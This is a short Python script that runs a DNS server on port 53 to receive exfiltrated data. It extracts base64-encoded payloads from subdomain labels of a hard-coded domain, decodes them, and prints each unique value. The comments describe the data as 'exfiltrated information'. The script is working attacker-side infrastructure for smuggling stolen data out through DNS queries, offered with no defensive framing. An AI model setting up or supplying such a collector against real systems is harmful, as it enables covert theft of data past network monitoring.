
from binascii import a2b_hex, b2a_hex
import re
import socket
from dnslib import DNSRecord
import base64

# Gets rid of duplicates. If you want duplicates, just remove this.
hist = set()

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
# DNS requests are sent to port 53
sock.bind(("0.0.0.0", 53))

while True:
    data, addr = sock.recvfrom(2048)

    try:
        msg = DNSRecord.parse(a2b_hex(b2a_hex(data)))
    except Exception as e:
        print(e)
        continue

    # The exfiltrated information should be in the first part of the URL.
    # Replace with whatever your subdomain is.
    m = re.search(r'\;(\S+)\.qqq\.wergm\.uk', str(msg), re.MULTILINE)
    if m:
        payload = m.group(1)
        try:
            decoded = base64.b64decode(payload.encode("ascii")).decode("ascii")
            if decoded not in hist:
                hist.add(decoded)
                print(decoded)
        except:
            print(payload)